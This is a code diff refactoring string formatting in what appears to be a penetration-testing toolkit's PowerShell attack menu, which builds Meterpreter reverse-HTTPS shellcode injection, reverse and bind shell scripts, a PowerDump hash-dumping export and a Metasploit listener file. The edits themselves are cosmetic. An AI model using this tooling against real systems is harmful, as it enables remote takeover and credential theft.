@@ -30,19 +30,19 @@ if powershell_menu_choice != "99":
     # specify ipaddress of reverse listener
     #ipaddr = core.grab_ipaddress()
     ipaddr = input("Enter the IPAddress or DNS name for the reverse host: ")
-    core.update_options("IPADDR=" + ipaddr)
+    core.update_options(f"IPADDR={ipaddr}")
 
     # if we select alphanumeric shellcode
     if powershell_menu_choice == "1":
         port = input(core.setprompt(["29"], "Enter the port for the reverse [443]"))
         if not port:
             port = "443"
-        core.update_options("PORT=" + port)
+        core.update_options(f"PORT={port}")
         core.update_options("POWERSHELL_SOLO=ON")
         core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
 
-        with open(core.userconfigpath + "payload_options.shellcode", "w") as filewrite:
-            filewrite.write("windows/meterpreter/reverse_https {},".format(port))
+        with open(f"{core.userconfigpath}payload_options.shellcode", "w") as filewrite:
+            filewrite.write(f"windows/meterpreter/reverse_https {port},")
 
         try:
             core.module_reload(src.payloads.powershell.prep)
@@ -52,24 +52,21 @@ if powershell_menu_choice != "99":
         #prep_powershell_payload()
 
         # create the directory if it does not exist
-        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
-            os.makedirs(core.userconfigpath + "reports/powershell")
+        if not os.path.isdir(f"{core.userconfigpath}reports/powershell"):
+            os.makedirs(f"{core.userconfigpath}reports/powershell")
 
         # here we format everything for us
-        with  open(core.userconfigpath + "x86.powershell") as fileopen:
+        with open(f"{core.userconfigpath}x86.powershell") as fileopen:
             x86 = fileopen.read()
         x86 = core.powershell_encodedcommand(x86)
         core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.userconfigpath, "reports/powershell/")))
-        with open(core.userconfigpath + "reports/powershell/x86_powershell_injection.txt", "w") as filewrite:
+        with open(f"{core.userconfigpath}reports/powershell/x86_powershell_injection.txt", "w") as filewrite:
             filewrite.write(x86)
 
         choice = core.yesno_prompt("0", "Do you want to start the listener now [yes/no]: ")
-        if choice == 'NO':
-            pass
-
         # if we want to start the listener
         if choice == 'YES':
-            with open(core.userconfigpath + "reports/powershell/powershell.rc", "w") as filewrite:
+            with open(f"{core.userconfigpath}reports/powershell/powershell.rc", "w") as filewrite:
                 filewrite.write("use multi/handler\n"
                                 "set payload windows/meterpreter/reverse_https\n"
                                 "set LPORT {0}\n"
@@ -101,9 +98,9 @@ if powershell_menu_choice != "99":
         data = data.replace("PORTHERE", port)
         core.print_status("Exporting the powershell stuff to {0}".format(os.path.join(core.userconfigpath, "reports/powershell")))
         # create the directory if it does not exist
-        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
-            os.makedirs(core.userconfigpath + "reports/powershell")
-        with open(core.userconfigpath + "reports/powershell/powershell.reverse.txt", "w") as filewrite:
+        if not os.path.isdir(f"{core.userconfigpath}reports/powershell"):
+            os.makedirs(f"{core.userconfigpath}reports/powershell")
+        with open(f"{core.userconfigpath}reports/powershell/powershell.reverse.txt", "w") as filewrite:
             filewrite.write(data)
 
         choice = core.yesno_prompt("0", "Do you want to start a listener [yes/no]")
@@ -124,9 +121,9 @@ if powershell_menu_choice != "99":
             data = fileopen.read()
         data = data.replace("PORTHERE", port)
         # create the directory if it does not exist
-        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
-            os.makedirs(core.userconfigpath + "reports/powershell")
-        with open(core.userconfigpath + "reports/powershell/powershell.bind.txt", "w") as filewrite:
+        if not os.path.isdir(f"{core.userconfigpath}reports/powershell"):
+            os.makedirs(f"{core.userconfigpath}reports/powershell")
+        with open(f"{core.userconfigpath}reports/powershell/powershell.bind.txt", "w") as filewrite:
             filewrite.write(data)
         core.print_status("The powershell program has been exported to {0}".format(os.path.join(core.userconfigpath, "reports/powershell/")))
         core.return_continue()
@@ -135,11 +132,16 @@ if powershell_menu_choice != "99":
     if powershell_menu_choice == "4":
 
         # create the directory if it does not exist
-        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
-            os.makedirs(core.userconfigpath + "reports/powershell")
+        if not os.path.isdir(f"{core.userconfigpath}reports/powershell"):
+            os.makedirs(f"{core.userconfigpath}reports/powershell")
         # copy file
         if os.path.isfile("src/powershell/powerdump.encoded"):
-            shutil.copyfile("src/powershell/powerdump.encoded", core.userconfigpath + "reports/powershell/powerdump.encoded.txt")
-        core.print_status("The powershell program has been exported to {}".format(os.path.join(core.userconfigpath, "reports/powershell")))
+            shutil.copyfile(
+                "src/powershell/powerdump.encoded",
+                f"{core.userconfigpath}reports/powershell/powerdump.encoded.txt",
+            )
+        core.print_status(
+            f'The powershell program has been exported to {os.path.join(core.userconfigpath, "reports/powershell")}'
+        )
         core.print_status("Note with PowerDump -- You MUST be running as SYSTEM when executing.")
         core.return_continue()
